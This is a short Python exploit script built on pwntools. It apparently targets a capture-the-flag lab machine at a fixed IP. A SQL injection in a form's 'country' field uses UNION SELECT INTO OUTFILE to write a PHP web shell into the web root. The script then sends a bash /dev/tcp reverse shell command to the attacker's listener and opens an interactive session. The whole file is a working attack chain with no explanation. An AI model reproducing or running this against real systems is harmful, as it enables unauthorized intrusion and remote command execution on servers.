#!/usr/bin/python3

from pwn import *
import signal, requests, sys, urllib3

#ctrl + c

def def_handler(sig,frame):
	log.failure("Exit...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) != 4:
	log.failure("Usage: python3 " + sys.argv[0] + " <attacker_ip>" + " <port>" + " <file_name.php>")
	log.failure("Example: python3 " + sys.argv[0] + " 10.10.65.15" + " 443" + " webshell.php")
	sys.exit(0)


#Global variables
target_url= "http://10.10.11.116/"
ip_address = sys.argv[1]
port = sys.argv[2]
fileName = sys.argv[3]

def fileUploader():
	data_post = {
		'username': 'kien',
		'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -""" % (fileName)
	}

	r = requests.post(target_url, data=data_post)

def reverseShell():
	data_post = {
		'cmd': "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (ip_address,port)
	}

	r = requests.post(target_url + "%s" % fileName, data=data_post)

if __name__ == '__main__':

	p1 = log.progress("Attacking " + target_url)
	p1.status("Uploading Malicious File")
	sleep(2)

	try:
		fileUploader()
		p1.status("File uploaded!!")
	except:
		log.failure("Someting Wrong")

	try:
		threading.Thread(target=reverseShell, args=()).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(port, timeout=20).wait_for_connection()
	shell.interactive()
